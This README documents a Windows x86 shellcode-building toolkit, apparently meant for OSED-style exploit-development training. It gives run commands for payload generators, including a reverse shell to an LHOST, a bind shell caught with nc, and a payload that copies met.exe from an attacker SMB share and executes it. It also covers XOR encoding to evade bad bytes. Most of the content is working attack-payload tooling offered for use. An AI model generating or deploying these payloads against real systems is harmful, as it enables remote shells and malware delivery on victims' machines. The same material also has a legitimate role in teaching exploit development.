# Shellcode Examples

Progressive examples showing how to use the `Tools/shellcode_x86_win` toolkit
to build, assemble, and test Windows x86 shellcode.  Each script runs on any
platform with `uv` installed; the `--run` flag requires a live Windows target.

## Prerequisites

```bash
# One-time: install uv
curl -LsSf https://astral.sh/uv/install.sh | sh

# Optional: install Keystone (needed for --hex / --run, not for --asm)
uv pip install keystone-engine
```

## Examples

### 01 — WinExec calc.exe (hand-written ASM)

Bare-metal shellcode written entirely by hand.  Teaches the foundational
techniques every subsequent example builds on:

- PEB walk to locate `kernel32.dll` base address
- JMP/CALL/POP trampoline for position-independent code
- ROR-13 hash-based export resolution (`find_function`)
- Null-free string push via the negation trick

```bash
uv run Examples/01_calc_winexec.py --asm     # view generated ASM
uv run Examples/01_calc_winexec.py --hashes  # print ROR-13 hash for WinExec
uv run Examples/01_calc_winexec.py --hex     # assembled shellcode as \xNN string
uv run Examples/01_calc_winexec.py --run     # execute (Windows only)
```

---

### 02 — Reverse shell (`revshell_code` builder)

Delegates ASM generation to the toolkit's `revshell_code()` builder.  New
concepts:

- `revshell_code()` returns `(asm, SlotAllocator)` — inspect `--slots` to see
  the EBP frame layout
- Single-byte XOR encoder with inline decoder stub (`--bad`)
- Multiple output formats: hex string, C byte array (`--c`), raw binary (`--out`)

```bash
uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443
uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --asm
uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --bad 000a0d
uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --c
uv run Examples/02_revshell.py --lhost 192.168.1.10 --lport 443 --slots
```

---

### 03 — Bind shell (`bindshell_code` builder)

Server-side socket; no outbound connection required.  Adds:

- `bindshell_code()` — bind/listen/accept flow
- `encode_port()` — warns when the chosen port produces null bytes in
  network byte order (e.g. port 256 = `0x0100`)

```bash
uv run Examples/03_bindshell.py --port 4444
uv run Examples/03_bindshell.py --port 4444 --bad 000a0d --asm
uv run Examples/03_bindshell.py --port 4444 --hex

# Catch the shell:
nc <target_ip> 4444
```

---

### 04 — Custom function resolution

Steps down from the high-level builders to the low-level primitives.  Resolves
`WinExec` from kernel32 and `MessageBoxA` from user32, then calls both.

- `build_resolve_block()` — generates the push/call/mov hash-resolution triples
- `build_load_and_resolve()` — `LoadLibraryA` + resolve for a second DLL
- `SlotAllocator` — tracks every `[ebp+N]` function-pointer slot automatically
- `stack_string_pushes()` — null-free push sequence for arbitrary strings

```bash
uv run Examples/04_custom_functions.py --asm
uv run Examples/04_custom_functions.py --hashes
uv run Examples/04_custom_functions.py --slots
uv run Examples/04_custom_functions.py --hex
```

---

### 05 — File-copy-and-execute (full toolkit)

Most complex example; mirrors a realistic OSED-style payload end-to-end.

**Flow:**

1. PEB walk → kernel32
2. Resolve: `LoadLibraryA`, `CreateProcessA`, `TerminateProcess`, `MoveFileA`, `lstrcatA`
3. `LoadLibraryA("advapi32.dll")` → `OpenProcessToken`
4. `LoadLibraryA("userenv.dll")` → `GetUserProfileDirectoryA`
5. `OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY)` → `hToken`
6. `GetUserProfileDirectoryA(hToken, buf, &size)` → user profile path
7. `lstrcatA(buf, "\\met.exe")` → full local destination path
8. `MoveFileA("\\\\attacker\\share\\met.exe", buf)` → copy from SMB share
9. `CreateProcessA(NULL, buf)` → execute the dropped file
10. `TerminateProcess(current, 0)`

```bash
# Double-escape the UNC path on the command line:
uv run Examples/05_file_copy_exec.py --smb "\\\\192.168.1.10\\share\\met.exe" --asm
uv run Examples/05_file_copy_exec.py --smb "\\\\192.168.1.10\\share\\met.exe" --hashes
uv run Examples/05_file_copy_exec.py --smb "\\\\192.168.1.10\\share\\met.exe" --hex
uv run Examples/05_file_copy_exec.py --smb "\\\\192.168.1.10\\share\\met.exe" --out payload.bin
```

---

## Common flags

| Flag | Description |
|------|-------------|
| `--asm` | Print generated ASM source (no Keystone needed) |
| `--hashes` | Print ROR-13 hashes for every resolved function |
| `--slots` | Print EBP slot layout (`[ebp+N] → FunctionName`) |
| `--hex` | Print shellcode as `\xNN` escape string |
| `--bad <hex>` | Bad byte list, e.g. `000a0d`; triggers XOR encoder |
| `--out <file>` | Write raw bytes to file |
| `--run` | Allocate + execute shellcode (Windows only) |

## Toolkit reference

```
Tools/shellcode_x86_win/
├── __init__.py          # Public API: ror_hash, assemble, revshell_code,
│                        #   bindshell_code, custom_code, SlotAllocator,
│                        #   stack_string_pushes, encode_port
├── assembler.py         # assemble(), assemble64(), check_bad_chars()
├── builders.py          # build_resolve_block(), build_load_and_resolve(),
│                        #   _PROLOGUE, _FIND_KERNEL32, _FIND_FUNCTION_THUNK
├── hashing.py           # ror_hash(), rolxor_hash()
└── payloads.py          # revshell_code(), bindshell_code(), custom_code()
```
